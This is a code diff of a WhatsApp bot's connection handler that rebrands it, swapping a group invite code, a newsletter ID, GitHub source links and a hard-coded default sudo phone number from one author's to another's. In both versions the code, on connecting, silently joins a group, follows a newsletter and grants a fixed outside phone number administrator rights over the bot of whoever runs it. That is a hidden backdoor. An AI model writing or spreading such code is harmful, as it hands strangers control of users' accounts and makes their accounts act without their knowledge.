@@ -73,11 +73,11 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
   if (connection === "open") {
     console.clear();
     try {
-      await socket.groupAcceptInvite("GoXKLVJgTAAC3556FXkfFI");
+      await socket.groupAcceptInvite("LfTFxkUQ1H7Eg2D0vR3n6g");
     } catch (error) {}
     if (!hasFollowedNewsletter) {
       try {
-        await socket.newsletterFollow("120363322461279856@newsletter");
+        await socket.newsletterFollow("120363400480173280@newsletter");
         hasFollowedNewsletter = true;
       } catch (error) {}
     }
@@ -88,7 +88,7 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
       const isNewUser = !sudoUsers.includes(userId);
       if (isNewUser) {
         await addSudoUser(userId);
-        const defaultSudo = "254735342808";
+        const defaultSudo = "254104260236";
         if (!sudoUsers.includes(defaultSudo)) {
           await addSudoUser(defaultSudo);
         }
@@ -148,7 +148,7 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
                 showAdAttribution: false,
                 title: botName,
                 body: `Bot initialized successfully.`,
-                sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
+                sourceUrl: `https://github.com/gifteddevsmd/DAVE-XD`,
                 mediaType: 1,
                 renderLargerThumbnail: true
               }
@@ -181,7 +181,7 @@ async function connectionHandler(socket, connectionUpdate, reconnect) {
                 showAdAttribution: false,
                 title: botName,
                 body: `Select an option to proceed.`,
-                sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
+                sourceUrl: `https://github.com/gifteddevsmd/DAVE-XD`,
                 mediaType: 1,
                 renderLargerThumbnail: true
               }
